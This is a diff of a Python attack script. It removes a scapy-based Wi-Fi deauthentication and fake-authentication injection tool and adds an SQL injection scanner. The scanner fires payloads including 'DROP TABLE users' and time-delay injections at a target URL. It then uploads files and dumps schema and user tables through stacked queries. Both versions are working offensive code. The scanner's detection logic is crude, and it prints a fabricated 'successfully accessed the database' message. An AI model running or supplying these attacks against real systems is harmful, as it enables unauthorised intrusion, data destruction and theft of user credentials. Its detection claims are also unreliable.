@@ -1,12 +1,15 @@
-import argparse
-from scapy.all import *
+import requests
 import time
+import argparse
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
 from colorama import Fore, Style, init
+from datetime import datetime
 
-# Initialize colorama for Windows compatibility
+# Initialize colorama
 init()
 
-# Function to print a banner
+# Function to print the banner
 def banner():
     # Colors from colorama
     yellow = Fore.YELLOW
@@ -23,49 +26,163 @@ def banner():
     """
     print(syringe)
 
-# Function to send deauthentication packets
-def send_deauth(iface, bssid, target_mac):
-    print("[+] Sending deauthentication packets...")
-    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth()
-    sendp(pkt, iface=iface, count=100, inter=0.01, verbose=0)  # Increased packet count and reduced interval for powerful injection
+# List of payloads for basic SQL injection tests
+PAYLOADS = [
+    "' OR 1=1 --",
+    "' OR 'a'='a",
+    "'; DROP TABLE users; --",
+    "' UNION SELECT NULL, NULL --",
+    "'; WAITFOR DELAY '0:0:5' --",  # Time-based payload for SQL Server
+    "' AND SLEEP(5) --",  # Time-based payload for MySQL
+]
 
-# Function to perform fake authentication
-def fake_auth(iface, bssid, target_mac):
-    print("[+] Performing fake authentication...")
-    auth_packet = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/Dot11Auth(algo=0, seqnum=1, status=0)
-    sendp(auth_packet, iface=iface, verbose=0)
+# Function to print time with INFO label in the desired colors
+def print_info(message):
+    current_time = datetime.now().strftime("%H:%M:%S")
+    print(f"{Fore.BLUE}[{current_time}]{Fore.YELLOW} [INFO] {Style.RESET_ALL}{message}")
 
-# Function to inject arbitrary packets
-def packet_injection(iface, bssid, target_mac):
-    print("[+] Performing packet injection...")
-    custom_packet = RadioTap()/Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)/LLC()/SNAP()/Raw(load="CustomPayload")
-    sendp(custom_packet, iface=iface, count=50, inter=0.02, verbose=0)  # Custom payload injection
+# Function to perform a basic SQL injection test
+def test_sqli(url, payload):
+    try:
+        print_info(f"Testing payload: {payload}")
+        # Test with the payload appended to the URL
+        response = requests.get(url + payload)
+        
+        # Check for response status or any indications of SQL injection
+        if "error" in response.text.lower():
+            print(f"Potential SQLi found using payload: {payload}")
+            print(f"Response: {response.text[:200]}")  # Print the first 200 chars of response for context
+        elif payload in response.url:
+            print(f"Possible blind SQLi or URL injection: {payload}")
+            return True
+    except Exception as e:
+        print(f"Error with the request: {e}")
+    return False
 
-# Main function
-def main(args):
-    print("[+] Starting Fake Authentication Attack (Educational Use Only)")
-    send_deauth(args.iface, args.bssid, args.target_mac)
-    time.sleep(1)  # Wait a bit to ensure disassociation
-    fake_auth(args.iface, args.bssid, args.target_mac)
-    packet_injection(args.iface, args.bssid, args.target_mac)
-    print("[+] Fake authentication and packet injection completed.")
+# Function for time-based SQL injection testing (useful for Blind SQLi)
+def time_based_sqli(url, payload, delay=5):
+    try:
+        print_info(f"Testing time-based payload: {payload}")
+        start_time = time.time()
+        response = requests.get(url + payload)
+        elapsed_time = time.time() - start_time
+        
+        # If there's a noticeable delay, it's likely a time-based SQLi
+        if elapsed_time > delay:
+            print(f"Time-based SQLi detected: Payload caused delay of {elapsed_time:.2f}s")
+            print(f"Response: {response.text[:200]}")
+            return True
+    except Exception as e:
+        print(f"Error with the request: {e}")
+    return False
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Perform a Fake Authentication Attack on a wireless network (Educational use only).")
+# Function to interact with the database (real execution)
+def interact_with_db(url):
+    print("\nWelcome to the server! You have successfully accessed the database.")
     
-    # Arguments for the script
-    parser.add_argument("-i", "--iface", type=str, required=True, help="Monitor mode interface (e.g., wlan0mon)")
-    parser.add_argument("-b", "--bssid", type=str, required=True, help="BSSID (MAC address) of the target access point")
-    parser.add_argument("-t", "--target_mac", type=str, required=True, help="Target device MAC address")
+    while True:
+        command = input("Enter 'upload' to upload a file or 'dump' to dump database info: ").strip().lower()
 
-    # Parse arguments
-    args = parser.parse_args()
+        if command == 'upload':
+            # Real file upload: This assumes an application vulnerability exists to upload files
+            file_to_upload = input("Enter file path to upload: ").strip()
 
-    # Display banner
+            # Prepare file upload (this depends on the web application's vulnerability)
+            with open(file_to_upload, 'rb') as file:
+                files = {'file': (file.name, file, 'multipart/form-data')}
+                response = requests.post(url, files=files)
+
+            print(f"Uploading file {file_to_upload}... Response: {response.status_code}")
+            if response.status_code == 200:
+                print("File uploaded successfully!")
+            else:
+                print("Failed to upload the file.")
+
+        elif command == 'dump':
+            # Real database dumping: Perform SQL queries to dump database information
+            print("Dumping database information...")
+            # Querying tables in the database
+            dump_tables(url)
+        else:
+            print("Invalid command! Please enter 'upload' or 'dump'.")
+
+# Function to dump database tables and user information
+def dump_tables(url):
+    # Example queries for dumping database tables and user info (real database interaction needed)
+    print("Retrieving database tables...")
+
+    # SQL queries for database information (adjust for actual database being used)
+    queries = [
+        "SELECT table_name FROM information_schema.tables;",  # List all tables
+        "SELECT column_name FROM information_schema.columns WHERE table_name='users';",  # List columns in 'users' table
+        "SELECT * FROM users;",  # Dump all user information (e.g., usernames, passwords)
+    ]
+
+    for query in queries:
+        print_info(f"Executing query: {query}")
+        # Send the SQL query via SQLi (assuming the URL is vulnerable)
+        payload = f"'; {query} --"
+        response = requests.get(url + payload)
+
+        # Print the results of the SQL query
+        print(f"Response: {response.text[:200]}...")  # Limit output for readability
+
+# Function to find form inputs in the HTML page using BeautifulSoup
+def find_form_inputs(url):
+    try:
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        # Find all form inputs and links
+        forms = soup.find_all('form')
+        inputs = soup.find_all('input')
+        links = soup.find_all('a', href=True)
+
+        print("\nFound forms and input parameters:")
+        for form in forms:
+            print(f"Form: {form.get('action')}")
+            for input_tag in form.find_all('input'):
+                input_name = input_tag.get('name')
+                if input_name:
+                    print(f"  - Input field: {input_name}")
+
+        print("\nFound links (possible injection points):")
+        for link in links:
+            href = link.get('href')
+            absolute_url = urljoin(url, href)
+            print(f"  - Link: {absolute_url}")
+            
+        return inputs, links
+
+    except Exception as e:
+        print(f"Error finding forms and links: {e}")
+        return [], []
+
+# Main function to scan the URL
+def scan_url(url):
+    print_info(f"Scanning URL: {url}")
+    
+    # Test each payload on the URL
+    for payload in PAYLOADS:
+        if test_sqli(url, payload) or time_based_sqli(url, payload):
+            # If an SQL injection is found, interact with the database
+            interact_with_db(url)
+            return
+
+    print_info("No SQL injection vulnerabilities found.")
+
+# Set up argparse for command-line arguments
+def main():
+    # Print the banner at the start of the script
     banner()
 
-    # Print command usage
-    print("\nUsage: python script.py -i <iface> -b <bssid> -t <target_mac>")
-    
-    # Run the main function with the parsed arguments
-    main(args)
+    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Database Interaction")
+    parser.add_argument("-u", "--url", required=True, help="The target URL to scan for SQL injection")
+    args = parser.parse_args()
+
+    # Scan the URL specified by the user
+    scan_url(args.url)
+
+# Entry point for the script
+if __name__ == "__main__":
+    main()
